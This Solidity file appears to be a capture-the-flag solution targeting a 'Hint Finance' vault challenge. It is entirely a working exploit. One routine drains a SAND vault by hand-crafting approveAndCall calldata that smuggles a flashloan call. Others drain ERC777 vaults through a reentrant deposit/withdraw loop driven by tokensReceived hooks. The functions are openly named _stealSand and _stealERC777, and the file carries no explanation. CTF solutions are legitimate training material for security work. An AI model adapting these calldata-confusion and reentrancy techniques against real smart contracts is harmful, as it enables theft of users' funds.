// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

import "public/Setup.sol";

interface IERC1820Registry {
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}


contract Impl {

    Setup public setup;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function runExploit() external payable {

        address erc1820Registry = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
        bytes32 AMPS_TOKEN_RECIPIENT_HASH = 0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a;
        bytes32 PNETWORK_TOKENS_RECIPIENT_INTERFACE_HASH = 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;
        IERC1820Registry(erc1820Registry).setInterfaceImplementer(address(this), AMPS_TOKEN_RECIPIENT_HASH, address(this));
        IERC1820Registry(erc1820Registry).setInterfaceImplementer(address(this), PNETWORK_TOKENS_RECIPIENT_INTERFACE_HASH, address(this));

        _stealSand();
        _stealERC777(0);
        _stealERC777(2);
    }

    function _stealSand() internal {
        address sand = setup.underlyingTokens(1);
        address vault = setup.hintFinanceFactory().underlyingToVault(sand);

        bytes memory cd = abi.encodeWithSignature("approveAndCall(address,uint256,bytes)");
        cd = abi.encodePacked(cd, abi.encode(address(vault)));                                              // target
        cd = abi.encodePacked(cd, hex"0000000000000000000000000000000000000000000000000000000000000000");   // amount
        cd = abi.encodePacked(cd, hex"0000000000000000000000000000000000000000000000000000000000000060");   // bytes

        bytes memory cd2 = abi.encodeWithSignature("flashloan(address,uint256,bytes)");
        cd2 = abi.encodePacked(cd2, abi.encode(address(this)));                                             // token
        cd2 = abi.encodePacked(cd2, hex"00000000000000000000000000000000000000000000000000000000000000a0"); // amount (needs to be interpreted as a pointer to the bytes)
        cd2 = abi.encodePacked(cd2, hex"0000000000000000000000000000000000000000000000000000000000000060"); // data (need first argument to be address(vault))
        cd2 = abi.encodePacked(cd2, hex"0000000000000000000000000000000000000000000000000000000000000044"); // data
        cd2 = abi.encodePacked(cd2, hex"70a08231");                                                         // random 4 bytes (cast sig "balanceOf()")
        cd2 = abi.encodePacked(cd2, abi.encode(address(vault)));                                            // address(vault)
        cd2 = abi.encodePacked(cd2, abi.encode(address(vault)));                                            // random data to make length long enough

        cd = abi.encodePacked(cd, cd2.length);
        cd = abi.encodePacked(cd, cd2);

        (bool success, ) = sand.call(cd);
        require(success);

        ERC20Like(sand).transferFrom(address(vault), address(this), ERC20Like(sand).balanceOf(address(vault)));
    }

    function _stealERC777(uint256 idx) internal {
        address token = setup.underlyingTokens(idx);
        address vault = setup.hintFinanceFactory().underlyingToVault(token);

        UniswapV2RouterLike router = UniswapV2RouterLike(0xf164fC0Ec4E93095b804a4795bBe1e041497b92a);
        address[] memory path = new address[](2);
        path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        path[1] = token;
        router.swapExactETHForTokens{value: 25 ether}(0, path, address(this), block.timestamp);

        ERC20Like(token).approve(vault, type(uint256).max);

        while (true) {
            entered = false;
            uint256 shares = HintFinanceVault(vault).deposit(ERC20Like(token).balanceOf(address(this)));
            HintFinanceVault(vault).withdraw(shares);
            HintFinanceVault(vault).withdraw(HintFinanceVault(vault).balanceOf(address(this)));
            entered = false;
            
            uint256 oldBalance = setup.initialUnderlyingBalances(idx);
            uint256 curBalance = ERC20Like(token).balanceOf(vault);
            if (curBalance < oldBalance / 100) break;
        }
        entered = true;
    }


    function transfer(address, uint) external returns (bool) { 
        return true; 
    }

    function transferFrom(address, address, uint) external returns (bool) { 
        return true; 
    }

    function approve(address, uint) external returns (bool) { 
        return true; 
    }

    function balanceOf(address) external view returns (uint) { 
        return 10; 
    }

    bool entered = true;

    function tokensReceived(address, address from, address, uint256 amount, bytes calldata, bytes calldata) external {
        if (!entered) {
            entered = true;
            uint256 shares = HintFinanceVault(from).deposit(amount);
        }
    }

    function tokensReceived(bytes4, bytes32, address, address from, address, uint256 amount, bytes calldata, bytes calldata) external {
        if (!entered) {
            entered = true;
            uint256 shares = HintFinanceVault(from).deposit(amount);
        }
    }
}

contract Exploit {
    constructor(Setup setup) payable {
        (new Impl(setup)).runExploit{value: 50 ether}();
    }
}